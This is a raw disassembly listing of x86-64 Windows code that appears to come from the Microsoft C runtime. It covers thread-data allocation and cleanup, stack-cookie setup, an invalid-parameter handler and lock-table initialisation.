   1400034d2:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400034d7:	e8 78 07 00 00       	call   0x140003c54
   1400034dc:	90                   	nop
   1400034dd:	48 89 bb c0 00 00 00 	mov    %rdi,0xc0(%rbx)
   1400034e4:	48 85 ff             	test   %rdi,%rdi
   1400034e7:	75 0e                	jne    0x1400034f7
   1400034e9:	48 8b 05 c0 83 00 00 	mov    0x83c0(%rip),%rax        # 0x14000b8b0
   1400034f0:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   1400034f7:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   1400034fe:	e8 91 17 00 00       	call   0x140004c94
   140003503:	90                   	nop
   140003504:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140003509:	e8 46 06 00 00       	call   0x140003b54
   14000350e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003513:	48 83 c4 20          	add    $0x20,%rsp
   140003517:	5f                   	pop    %rdi
   140003518:	c3                   	ret
   140003519:	cc                   	int3
   14000351a:	cc                   	int3
   14000351b:	cc                   	int3
   14000351c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003521:	57                   	push   %rdi
   140003522:	48 83 ec 20          	sub    $0x20,%rsp
   140003526:	ff 15 f4 4b 00 00    	call   *0x4bf4(%rip)        # 0x140008120
   14000352c:	8b 0d a6 7c 00 00    	mov    0x7ca6(%rip),%ecx        # 0x14000b1d8
   140003532:	8b f8                	mov    %eax,%edi
   140003534:	ff 15 86 4c 00 00    	call   *0x4c86(%rip)        # 0x1400081c0
   14000353a:	48 8b d8             	mov    %rax,%rbx
   14000353d:	48 85 c0             	test   %rax,%rax
   140003540:	75 48                	jne    0x14000358a
   140003542:	8d 48 01             	lea    0x1(%rax),%ecx
   140003545:	ba c8 02 00 00       	mov    $0x2c8,%edx
   14000354a:	e8 f5 12 00 00       	call   0x140004844
   14000354f:	48 8b d8             	mov    %rax,%rbx
   140003552:	48 85 c0             	test   %rax,%rax
   140003555:	74 33                	je     0x14000358a
   140003557:	8b 0d 7b 7c 00 00    	mov    0x7c7b(%rip),%ecx        # 0x14000b1d8
   14000355d:	48 8b d0             	mov    %rax,%rdx
   140003560:	ff 15 62 4c 00 00    	call   *0x4c62(%rip)        # 0x1400081c8
   140003566:	48 8b cb             	mov    %rbx,%rcx
   140003569:	85 c0                	test   %eax,%eax
   14000356b:	74 16                	je     0x140003583
   14000356d:	33 d2                	xor    %edx,%edx
   14000356f:	e8 f0 fe ff ff       	call   0x140003464
   140003574:	ff 15 66 4c 00 00    	call   *0x4c66(%rip)        # 0x1400081e0
   14000357a:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   14000357f:	89 03                	mov    %eax,(%rbx)
   140003581:	eb 07                	jmp    0x14000358a
   140003583:	e8 64 e8 ff ff       	call   0x140001dec
   140003588:	33 db                	xor    %ebx,%ebx
   14000358a:	8b cf                	mov    %edi,%ecx
   14000358c:	ff 15 46 4c 00 00    	call   *0x4c46(%rip)        # 0x1400081d8
   140003592:	48 8b c3             	mov    %rbx,%rax
   140003595:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000359a:	48 83 c4 20          	add    $0x20,%rsp
   14000359e:	5f                   	pop    %rdi
   14000359f:	c3                   	ret
   1400035a0:	40 53                	rex push %rbx
   1400035a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400035a6:	e8 71 ff ff ff       	call   0x14000351c
   1400035ab:	48 8b d8             	mov    %rax,%rbx
   1400035ae:	48 85 c0             	test   %rax,%rax
   1400035b1:	75 08                	jne    0x1400035bb
   1400035b3:	8d 48 10             	lea    0x10(%rax),%ecx
   1400035b6:	e8 31 ef ff ff       	call   0x1400024ec
   1400035bb:	48 8b c3             	mov    %rbx,%rax
   1400035be:	48 83 c4 20          	add    $0x20,%rsp
   1400035c2:	5b                   	pop    %rbx
   1400035c3:	c3                   	ret
   1400035c4:	48 85 c9             	test   %rcx,%rcx
   1400035c7:	0f 84 29 01 00 00    	je     0x1400036f6
   1400035cd:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400035d2:	57                   	push   %rdi
   1400035d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400035d7:	48 8b d9             	mov    %rcx,%rbx
   1400035da:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   1400035de:	48 85 c9             	test   %rcx,%rcx
   1400035e1:	74 05                	je     0x1400035e8
   1400035e3:	e8 04 e8 ff ff       	call   0x140001dec
   1400035e8:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1400035ec:	48 85 c9             	test   %rcx,%rcx
   1400035ef:	74 05                	je     0x1400035f6
   1400035f1:	e8 f6 e7 ff ff       	call   0x140001dec
   1400035f6:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   1400035fa:	48 85 c9             	test   %rcx,%rcx
   1400035fd:	74 05                	je     0x140003604
   1400035ff:	e8 e8 e7 ff ff       	call   0x140001dec
   140003604:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140003608:	48 85 c9             	test   %rcx,%rcx
   14000360b:	74 05                	je     0x140003612
   14000360d:	e8 da e7 ff ff       	call   0x140001dec
   140003612:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140003616:	48 85 c9             	test   %rcx,%rcx
   140003619:	74 05                	je     0x140003620
   14000361b:	e8 cc e7 ff ff       	call   0x140001dec
   140003620:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140003624:	48 85 c9             	test   %rcx,%rcx
   140003627:	74 05                	je     0x14000362e
   140003629:	e8 be e7 ff ff       	call   0x140001dec
   14000362e:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140003635:	48 85 c9             	test   %rcx,%rcx
   140003638:	74 05                	je     0x14000363f
   14000363a:	e8 ad e7 ff ff       	call   0x140001dec
   14000363f:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   140003646:	48 8d 05 c3 58 00 00 	lea    0x58c3(%rip),%rax        # 0x140008f10
   14000364d:	48 3b c8             	cmp    %rax,%rcx
   140003650:	74 05                	je     0x140003657
   140003652:	e8 95 e7 ff ff       	call   0x140001dec
   140003657:	bf 0d 00 00 00       	mov    $0xd,%edi
   14000365c:	8b cf                	mov    %edi,%ecx
   14000365e:	e8 f1 05 00 00       	call   0x140003c54
   140003663:	90                   	nop
   140003664:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   14000366b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003670:	48 85 c9             	test   %rcx,%rcx
   140003673:	74 1c                	je     0x140003691
   140003675:	f0 ff 09             	lock decl (%rcx)
   140003678:	75 17                	jne    0x140003691
   14000367a:	48 8d 05 3f 82 00 00 	lea    0x823f(%rip),%rax        # 0x14000b8c0
   140003681:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003686:	48 3b c8             	cmp    %rax,%rcx
   140003689:	74 06                	je     0x140003691
   14000368b:	e8 5c e7 ff ff       	call   0x140001dec
   140003690:	90                   	nop
   140003691:	8b cf                	mov    %edi,%ecx
   140003693:	e8 bc 04 00 00       	call   0x140003b54
   140003698:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000369d:	e8 b2 05 00 00       	call   0x140003c54
   1400036a2:	90                   	nop
   1400036a3:	48 8b bb c0 00 00 00 	mov    0xc0(%rbx),%rdi
   1400036aa:	48 85 ff             	test   %rdi,%rdi
   1400036ad:	74 2b                	je     0x1400036da
   1400036af:	48 8b cf             	mov    %rdi,%rcx
   1400036b2:	e8 69 16 00 00       	call   0x140004d20
   1400036b7:	48 3b 3d f2 81 00 00 	cmp    0x81f2(%rip),%rdi        # 0x14000b8b0
   1400036be:	74 1a                	je     0x1400036da
   1400036c0:	48 8d 05 89 80 00 00 	lea    0x8089(%rip),%rax        # 0x14000b750
   1400036c7:	48 3b f8             	cmp    %rax,%rdi
   1400036ca:	74 0e                	je     0x1400036da
   1400036cc:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400036cf:	75 09                	jne    0x1400036da
   1400036d1:	48 8b cf             	mov    %rdi,%rcx
   1400036d4:	e8 eb 16 00 00       	call   0x140004dc4
   1400036d9:	90                   	nop
   1400036da:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400036df:	e8 70 04 00 00       	call   0x140003b54
   1400036e4:	48 8b cb             	mov    %rbx,%rcx
   1400036e7:	e8 00 e7 ff ff       	call   0x140001dec
   1400036ec:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400036f1:	48 83 c4 20          	add    $0x20,%rsp
   1400036f5:	5f                   	pop    %rdi
   1400036f6:	c3                   	ret
   1400036f7:	cc                   	int3
   1400036f8:	40 53                	rex push %rbx
   1400036fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400036fe:	e8 bd ea ff ff       	call   0x1400021c0
   140003703:	e8 40 03 00 00       	call   0x140003a48
   140003708:	85 c0                	test   %eax,%eax
   14000370a:	74 60                	je     0x14000376c
   14000370c:	48 8d 0d b1 fe ff ff 	lea    -0x14f(%rip),%rcx        # 0x1400035c4
   140003713:	ff 15 cf 4a 00 00    	call   *0x4acf(%rip)        # 0x1400081e8
   140003719:	89 05 b9 7a 00 00    	mov    %eax,0x7ab9(%rip)        # 0x14000b1d8
   14000371f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003722:	74 48                	je     0x14000376c
   140003724:	ba c8 02 00 00       	mov    $0x2c8,%edx
   140003729:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000372e:	e8 11 11 00 00       	call   0x140004844
   140003733:	48 8b d8             	mov    %rax,%rbx
   140003736:	48 85 c0             	test   %rax,%rax
   140003739:	74 31                	je     0x14000376c
   14000373b:	8b 0d 97 7a 00 00    	mov    0x7a97(%rip),%ecx        # 0x14000b1d8
   140003741:	48 8b d0             	mov    %rax,%rdx
   140003744:	ff 15 7e 4a 00 00    	call   *0x4a7e(%rip)        # 0x1400081c8
   14000374a:	85 c0                	test   %eax,%eax
   14000374c:	74 1e                	je     0x14000376c
   14000374e:	33 d2                	xor    %edx,%edx
   140003750:	48 8b cb             	mov    %rbx,%rcx
   140003753:	e8 0c fd ff ff       	call   0x140003464
   140003758:	ff 15 82 4a 00 00    	call   *0x4a82(%rip)        # 0x1400081e0
   14000375e:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   140003763:	89 03                	mov    %eax,(%rbx)
   140003765:	b8 01 00 00 00       	mov    $0x1,%eax
   14000376a:	eb 07                	jmp    0x140003773
   14000376c:	e8 cb fc ff ff       	call   0x14000343c
   140003771:	33 c0                	xor    %eax,%eax
   140003773:	48 83 c4 20          	add    $0x20,%rsp
   140003777:	5b                   	pop    %rbx
   140003778:	c3                   	ret
   140003779:	cc                   	int3
   14000377a:	cc                   	int3
   14000377b:	cc                   	int3
   14000377c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003781:	57                   	push   %rdi
   140003782:	48 83 ec 20          	sub    $0x20,%rsp
   140003786:	48 8b 05 e3 7c 00 00 	mov    0x7ce3(%rip),%rax        # 0x14000b470
   14000378d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003793:	48 bf 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rdi
   14000379a:	2b 00 00 
   14000379d:	48 3b c7             	cmp    %rdi,%rax
   1400037a0:	74 0c                	je     0x1400037ae
   1400037a2:	48 f7 d0             	not    %rax
   1400037a5:	48 89 05 cc 7c 00 00 	mov    %rax,0x7ccc(%rip)        # 0x14000b478
   1400037ac:	eb 76                	jmp    0x140003824
   1400037ae:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400037b3:	ff 15 4f 4a 00 00    	call   *0x4a4f(%rip)        # 0x140008208
   1400037b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400037be:	ff 15 3c 4a 00 00    	call   *0x4a3c(%rip)        # 0x140008200
   1400037c4:	44 8b d8             	mov    %eax,%r11d
   1400037c7:	49 33 db             	xor    %r11,%rbx
   1400037ca:	ff 15 10 4a 00 00    	call   *0x4a10(%rip)        # 0x1400081e0
   1400037d0:	44 8b d8             	mov    %eax,%r11d
   1400037d3:	49 33 db             	xor    %r11,%rbx
   1400037d6:	ff 15 1c 4a 00 00    	call   *0x4a1c(%rip)        # 0x1400081f8
   1400037dc:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400037e1:	44 8b d8             	mov    %eax,%r11d
   1400037e4:	49 33 db             	xor    %r11,%rbx
   1400037e7:	ff 15 03 4a 00 00    	call   *0x4a03(%rip)        # 0x1400081f0
   1400037ed:	4c 8b 5c 24 38       	mov    0x38(%rsp),%r11
   1400037f2:	4c 33 db             	xor    %rbx,%r11
   1400037f5:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
   1400037fc:	ff 00 00 
   1400037ff:	4c 23 d8             	and    %rax,%r11
   140003802:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   140003809:	2b 00 00 
   14000380c:	4c 3b df             	cmp    %rdi,%r11
   14000380f:	4c 0f 44 d8          	cmove  %rax,%r11
   140003813:	4c 89 1d 56 7c 00 00 	mov    %r11,0x7c56(%rip)        # 0x14000b470
   14000381a:	49 f7 d3             	not    %r11
   14000381d:	4c 89 1d 54 7c 00 00 	mov    %r11,0x7c54(%rip)        # 0x14000b478
   140003824:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003829:	48 83 c4 20          	add    $0x20,%rsp
   14000382d:	5f                   	pop    %rdi
   14000382e:	c3                   	ret
   14000382f:	cc                   	int3
   140003830:	48 89 0d e9 90 00 00 	mov    %rcx,0x90e9(%rip)        # 0x14000c920
   140003837:	c3                   	ret
   140003838:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000383d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003842:	55                   	push   %rbp
   140003843:	57                   	push   %rdi
   140003844:	41 54                	push   %r12
   140003846:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   14000384d:	ff 
   14000384e:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140003855:	48 8b 05 14 7c 00 00 	mov    0x7c14(%rip),%rax        # 0x14000b470
   14000385c:	48 33 c4             	xor    %rsp,%rax
   14000385f:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   140003866:	41 8b f8             	mov    %r8d,%edi
   140003869:	8b f2                	mov    %edx,%esi
   14000386b:	8b d9                	mov    %ecx,%ebx
   14000386d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003870:	74 05                	je     0x140003877
   140003872:	e8 85 20 00 00       	call   0x1400058fc
   140003877:	83 64 24 70 00       	andl   $0x0,0x70(%rsp)
   14000387c:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140003881:	33 d2                	xor    %edx,%edx
   140003883:	41 b8 94 00 00 00    	mov    $0x94,%r8d
   140003889:	e8 92 20 00 00       	call   0x140005920
   14000388e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003893:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140003897:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000389b:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   1400038a0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400038a5:	ff 15 4d 4a 00 00    	call   *0x4a4d(%rip)        # 0x1400082f8
   1400038ab:	4c 8b a5 08 01 00 00 	mov    0x108(%rbp),%r12
   1400038b2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400038b7:	49 8b cc             	mov    %r12,%rcx
   1400038ba:	45 33 c0             	xor    %r8d,%r8d
   1400038bd:	e8 a8 2f 00 00       	call   0x14000686a
   1400038c2:	48 85 c0             	test   %rax,%rax
   1400038c5:	74 37                	je     0x1400038fe
   1400038c7:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400038cd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400038d2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400038d7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400038dc:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400038e1:	4c 8b c8             	mov    %rax,%r9
   1400038e4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400038e9:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400038ed:	4d 8b c4             	mov    %r12,%r8
   1400038f0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400038f5:	33 c9                	xor    %ecx,%ecx
   1400038f7:	e8 68 2f 00 00       	call   0x140006864
   1400038fc:	eb 1c                	jmp    0x14000391a
   1400038fe:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140003905:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000390c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140003913:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   14000391a:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140003921:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140003925:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140003929:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000392d:	ff 15 e5 48 00 00    	call   *0x48e5(%rip)        # 0x140008218
   140003933:	33 c9                	xor    %ecx,%ecx
   140003935:	8b f8                	mov    %eax,%edi
   140003937:	ff 15 4b 48 00 00    	call   *0x484b(%rip)        # 0x140008188
   14000393d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003942:	ff 15 c8 48 00 00    	call   *0x48c8(%rip)        # 0x140008210
   140003948:	85 c0                	test   %eax,%eax
   14000394a:	75 10                	jne    0x14000395c
   14000394c:	85 ff                	test   %edi,%edi
   14000394e:	75 0c                	jne    0x14000395c
   140003950:	83 fb ff             	cmp    $0xffffffff,%ebx
   140003953:	74 07                	je     0x14000395c
   140003955:	8b cb                	mov    %ebx,%ecx
   140003957:	e8 a0 1f 00 00       	call   0x1400058fc
   14000395c:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140003963:	48 33 cc             	xor    %rsp,%rcx
   140003966:	e8 c5 0d 00 00       	call   0x140004730
   14000396b:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140003972:	00 
   140003973:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140003977:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000397b:	49 8b e3             	mov    %r11,%rsp
   14000397e:	41 5c                	pop    %r12
   140003980:	5f                   	pop    %rdi
   140003981:	5d                   	pop    %rbp
   140003982:	c3                   	ret
   140003983:	cc                   	int3
   140003984:	48 83 ec 28          	sub    $0x28,%rsp
   140003988:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000398e:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140003993:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140003997:	e8 9c fe ff ff       	call   0x140003838
   14000399c:	ff 15 86 48 00 00    	call   *0x4886(%rip)        # 0x140008228
   1400039a2:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1400039a7:	48 8b c8             	mov    %rax,%rcx
   1400039aa:	48 83 c4 28          	add    $0x28,%rsp
   1400039ae:	48 ff 25 6b 48 00 00 	rex.W jmp *0x486b(%rip)        # 0x140008220
   1400039b5:	cc                   	int3
   1400039b6:	cc                   	int3
   1400039b7:	cc                   	int3
   1400039b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400039bd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400039c2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400039c7:	57                   	push   %rdi
   1400039c8:	48 83 ec 30          	sub    $0x30,%rsp
   1400039cc:	48 8b e9             	mov    %rcx,%rbp
   1400039cf:	48 8b 0d 4a 8f 00 00 	mov    0x8f4a(%rip),%rcx        # 0x14000c920
   1400039d6:	41 8b d9             	mov    %r9d,%ebx
   1400039d9:	49 8b f8             	mov    %r8,%rdi
   1400039dc:	48 8b f2             	mov    %rdx,%rsi
   1400039df:	ff 15 83 47 00 00    	call   *0x4783(%rip)        # 0x140008168
   1400039e5:	44 8b cb             	mov    %ebx,%r9d
   1400039e8:	4c 8b c7             	mov    %rdi,%r8
   1400039eb:	48 8b d6             	mov    %rsi,%rdx
   1400039ee:	48 8b cd             	mov    %rbp,%rcx
   1400039f1:	48 85 c0             	test   %rax,%rax
   1400039f4:	74 21                	je     0x140003a17
   1400039f6:	4c 8b 54 24 60       	mov    0x60(%rsp),%r10
   1400039fb:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003a00:	ff d0                	call   *%rax
   140003a02:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003a07:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003a0c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003a11:	48 83 c4 30          	add    $0x30,%rsp
   140003a15:	5f                   	pop    %rdi
   140003a16:	c3                   	ret
   140003a17:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003a1c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003a21:	e8 5e ff ff ff       	call   0x140003984
   140003a26:	cc                   	int3
   140003a27:	cc                   	int3
   140003a28:	48 83 ec 38          	sub    $0x38,%rsp
   140003a2c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003a32:	45 33 c9             	xor    %r9d,%r9d
   140003a35:	45 33 c0             	xor    %r8d,%r8d
   140003a38:	33 d2                	xor    %edx,%edx
   140003a3a:	33 c9                	xor    %ecx,%ecx
   140003a3c:	e8 77 ff ff ff       	call   0x1400039b8
   140003a41:	48 83 c4 38          	add    $0x38,%rsp
   140003a45:	c3                   	ret
   140003a46:	cc                   	int3
   140003a47:	cc                   	int3
   140003a48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003a4d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003a52:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003a57:	41 54                	push   %r12
   140003a59:	48 83 ec 20          	sub    $0x20,%rsp
   140003a5d:	4c 8d 25 7c 77 00 00 	lea    0x777c(%rip),%r12        # 0x14000b1e0
   140003a64:	33 f6                	xor    %esi,%esi
   140003a66:	33 db                	xor    %ebx,%ebx
   140003a68:	49 8b fc             	mov    %r12,%rdi
   140003a6b:	83 7f 08 01          	cmpl   $0x1,0x8(%rdi)
   140003a6f:	75 26                	jne    0x140003a97
   140003a71:	48 63 c6             	movslq %esi,%rax
   140003a74:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003a79:	ff c6                	inc    %esi
   140003a7b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003a7f:	48 8d 05 aa 8e 00 00 	lea    0x8eaa(%rip),%rax        # 0x14000c930
   140003a86:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140003a8a:	48 89 0f             	mov    %rcx,(%rdi)
   140003a8d:	ff 15 15 47 00 00    	call   *0x4715(%rip)        # 0x1400081a8
   140003a93:	85 c0                	test   %eax,%eax
   140003a95:	74 26                	je     0x140003abd
   140003a97:	ff c3                	inc    %ebx
   140003a99:	48 83 c7 10          	add    $0x10,%rdi
   140003a9d:	83 fb 24             	cmp    $0x24,%ebx
   140003aa0:	7c c9                	jl     0x140003a6b
   140003aa2:	b8 01 00 00 00       	mov    $0x1,%eax
   140003aa7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003aac:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003ab1:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003ab6:	48 83 c4 20          	add    $0x20,%rsp
   140003aba:	41 5c                	pop    %r12
   140003abc:	c3                   	ret
   140003abd:	48 63 c3             	movslq %ebx,%rax
   140003ac0:	48 03 c0             	add    %rax,%rax
   140003ac3:	49 83 24 c4 00       	andq   $0x0,(%r12,%rax,8)
   140003ac8:	33 c0                	xor    %eax,%eax
   140003aca:	eb db                	jmp    0x140003aa7
   140003acc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ad1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003ad6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003adb:	57                   	push   %rdi
   140003adc:	48 83 ec 20          	sub    $0x20,%rsp
   140003ae0:	bf 24 00 00 00       	mov    $0x24,%edi
   140003ae5:	48 8d 1d f4 76 00 00 	lea    0x76f4(%rip),%rbx        # 0x14000b1e0
   140003aec:	8b f7                	mov    %edi,%esi
   140003aee:	48 8b 2b             	mov    (%rbx),%rbp
   140003af1:	48 85 ed             	test   %rbp,%rbp
   140003af4:	74 1b                	je     0x140003b11
   140003af6:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   140003afa:	74 15                	je     0x140003b11
   140003afc:	48 8b cd             	mov    %rbp,%rcx
   140003aff:	ff 15 b3 46 00 00    	call   *0x46b3(%rip)        # 0x1400081b8
   140003b05:	48 8b cd             	mov    %rbp,%rcx
   140003b08:	e8 df e2 ff ff       	call   0x140001dec
   140003b0d:	48 83 23 00          	andq   $0x0,(%rbx)
   140003b11:	48 83 c3 10          	add    $0x10,%rbx
   140003b15:	48 ff ce             	dec    %rsi
   140003b18:	75 d4                	jne    0x140003aee
   140003b1a:	48 8d 1d c7 76 00 00 	lea    0x76c7(%rip),%rbx        # 0x14000b1e8
   140003b21:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   140003b25:	48 85 c9             	test   %rcx,%rcx
   140003b28:	74 0b                	je     0x140003b35
   140003b2a:	83 3b 01             	cmpl   $0x1,(%rbx)
   140003b2d:	75 06                	jne    0x140003b35
   140003b2f:	ff 15 83 46 00 00    	call   *0x4683(%rip)        # 0x1400081b8
   140003b35:	48 83 c3 10          	add    $0x10,%rbx
   140003b39:	48 ff cf             	dec    %rdi
   140003b3c:	75 e3                	jne    0x140003b21
   140003b3e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003b43:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003b48:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003b4d:	48 83 c4 20          	add    $0x20,%rsp
   140003b51:	5f                   	pop    %rdi
   140003b52:	c3                   	ret
   140003b53:	cc                   	int3
   140003b54:	48 63 c9             	movslq %ecx,%rcx
   140003b57:	48 8d 05 82 76 00 00 	lea    0x7682(%rip),%rax        # 0x14000b1e0
   140003b5e:	48 03 c9             	add    %rcx,%rcx
   140003b61:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   140003b65:	48 ff 25 c4 46 00 00 	rex.W jmp *0x46c4(%rip)        # 0x140008230
   140003b6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003b71:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003b76:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003b7b:	41 55                	push   %r13
   140003b7d:	48 83 ec 20          	sub    $0x20,%rsp
   140003b81:	48 63 d9             	movslq %ecx,%rbx
   140003b84:	be 01 00 00 00       	mov    $0x1,%esi
   140003b89:	48 83 3d df 84 00 00 	cmpq   $0x0,0x84df(%rip)        # 0x14000c070
   140003b90:	00 
   140003b91:	75 17                	jne    0x140003baa
   140003b93:	e8 08 ec ff ff       	call   0x1400027a0
   140003b98:	8d 4e 1d             	lea    0x1d(%rsi),%ecx
   140003b9b:	e8 a0 e9 ff ff       	call   0x140002540
   140003ba0:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003ba5:	e8 e6 e5 ff ff       	call   0x140002190
   140003baa:	48 8b fb             	mov    %rbx,%rdi
   140003bad:	48 03 ff             	add    %rdi,%rdi
   140003bb0:	4c 8d 2d 29 76 00 00 	lea    0x7629(%rip),%r13        # 0x14000b1e0
   140003bb7:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   140003bbd:	74 04                	je     0x140003bc3
   140003bbf:	8b c6                	mov    %esi,%eax
   140003bc1:	eb 79                	jmp    0x140003c3c
   140003bc3:	b9 28 00 00 00       	mov    $0x28,%ecx
   140003bc8:	e8 f7 0b 00 00       	call   0x1400047c4
   140003bcd:	48 8b d8             	mov    %rax,%rbx
   140003bd0:	48 85 c0             	test   %rax,%rax
   140003bd3:	75 0f                	jne    0x140003be4
   140003bd5:	e8 02 e5 ff ff       	call   0x1400020dc
   140003bda:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140003be0:	33 c0                	xor    %eax,%eax
   140003be2:	eb 58                	jmp    0x140003c3c
   140003be4:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140003be9:	e8 66 00 00 00       	call   0x140003c54
   140003bee:	90                   	nop
   140003bef:	48 8b cb             	mov    %rbx,%rcx
   140003bf2:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   140003bf8:	75 2d                	jne    0x140003c27
   140003bfa:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003bff:	ff 15 a3 45 00 00    	call   *0x45a3(%rip)        # 0x1400081a8
   140003c05:	85 c0                	test   %eax,%eax
   140003c07:	75 17                	jne    0x140003c20
   140003c09:	48 8b cb             	mov    %rbx,%rcx
   140003c0c:	e8 db e1 ff ff       	call   0x140001dec
   140003c11:	e8 c6 e4 ff ff       	call   0x1400020dc
   140003c16:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
